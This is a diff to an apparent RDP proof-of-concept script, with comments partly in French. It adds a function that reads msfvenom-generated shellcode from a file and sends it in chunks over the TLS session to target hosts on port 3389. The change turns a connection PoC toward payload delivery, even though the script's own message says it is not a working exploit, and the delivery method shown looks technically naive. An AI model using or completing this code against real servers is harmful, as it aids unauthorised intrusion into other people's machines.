@@ -171,6 +171,19 @@ RECEIVE = "\033[94m<-- \033[0m"
 def info(string):
     print("[ \033[32m+\033[0m ] {}".format(string))
 
+# Envoie du payload au canal approprié
+def send_payload(tls, payload_path):
+    with open(payload_path, "rb") as payload:
+        shellcode = payload.read()
+
+    # Divisez le shellcode en plusieurs morceaux si nécessaire
+    MAX_CHUNK_SIZE = 1600  # taille maximale par paquet
+    for i in range(0, len(shellcode), MAX_CHUNK_SIZE):
+        chunk = shellcode[i:i + MAX_CHUNK_SIZE]
+        print(f"Sending chunk {i//MAX_CHUNK_SIZE + 1}")
+        tls.sendall(chunk)
+
+    print("Payload sent successfully.")
 
 def error(string):
     print("[ \033[31m!\033[0m ] {}".format(string))
@@ -251,6 +264,8 @@ def start_rdp_connection(ip_addresses, port=3389):
                 ))
 
             # Continue with further steps if needed (Security Exchange, Info, etc.)
+            payload_path = "./payload.bin"  # Assurez-vous que le payload est généré avec msfvenom
+            send_payload(tls, payload_path)
 
             info("closing the connection now, this is a PoC not a working exploit")
             results[1].close()
